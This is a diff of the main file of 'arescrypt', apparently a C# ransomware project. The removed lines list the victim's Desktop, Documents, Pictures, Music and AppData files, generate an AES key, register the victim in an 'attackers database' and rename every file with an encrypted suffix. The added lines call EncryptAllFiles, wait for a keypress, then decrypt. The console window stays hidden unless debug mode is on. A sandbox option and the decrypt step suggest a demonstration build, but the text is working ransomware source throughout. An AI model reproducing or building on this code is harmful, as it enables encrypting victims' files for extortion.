@@ -1,8 +1,5 @@
 ﻿using System;
-using System.IO;
 using System.Windows.Forms;
-using System.Collections.Generic;
-using System.Security.Cryptography;
 
 namespace arescrypt
 {
@@ -10,9 +7,7 @@ namespace arescrypt
     {
         // Predefinitions
         static Configuration config = new Configuration(); // New instance of Configuration class
-        static Cryptography crypto = new Cryptography(); // New instance of Cryptography class
-        static UserData userData = new UserData();
-        static AccountManager accountManager = new AccountManager();
+        static Queue que = new Queue();
 
         [STAThread]
         static void Main(string[] args)
@@ -21,58 +16,10 @@ namespace arescrypt
             if (!config.debugMode)
                 Miscellaneous.HideWindow();
 
-            // Preset our variables that will contain the
-            // specified directories and files to encrypt.
-            var userSpecificDirs = new List<string> { "" };
-            string[] fullFileIndex = { "" };
-
-            // Check if sandboxing has been enabled in config
-            // If so, only "encrypt" files in the "sandboxDirectory/" folder
-            if (config.sandBox) // == true
-                if (Directory.Exists(config.sandBoxDirectory))
-                    userSpecificDirs.Add(config.sandBoxDirectory);
-                else
-                    Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + config.sandBoxDirectory);
-            else if (!config.sandBox)
-            {
-                // User specific directories, administrative rights shouldn't be required in order to write to these files
-                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
-                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
-                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
-                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
-                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
-            }
-            
-            // Preset variables for defining all discovered files
-            var userSpecificFiles = new List<string> { };
-
-            // Get all files in every directory specified above.
-            // Then add to a List<string> (array)
-            foreach (string dir in userSpecificDirs)
-                foreach (string file in FileHandler.DirSearch(dir))
-                    userSpecificFiles.Add(file);
-            fullFileIndex = userSpecificFiles.ToArray();
-
-            /* BEGIN ENCRYPTION/DECRYPTION SECTION */
-            using (AesManaged myAes = new AesManaged())
-            {
-                Cryptography.encKey = myAes.Key;
-                Cryptography.encIV = myAes.IV;
-            }
-
-            accountManager.CreateUser(); // Create new user account in attackers database
-            
-            // Cryptography.executeExample(); // Execute cryptography example
-
-            // Code for operation to run on all discovered files.
-            // Remember, application may not have read/write access to all files.
-            foreach (string file in fullFileIndex)
-            {
-                if (FileHandler.appendSuffixToFile(config.encryptedFileSuffix, file))
-                    Console.WriteLine("File, " + file + ", was renamed successfully.");
-            }
-
-            /* END ENCRYPTION/DECRYPTION SECTION */
+            que.EncryptAllFiles();
+            Console.WriteLine("All files encrypted. Press any key to launch decryption.");
+            Console.ReadKey();
+            que.DecryptAllFiles();
             
             // Giving "Debug Mode" switch in Configuration it's usability
             if (config.debugMode) // == true
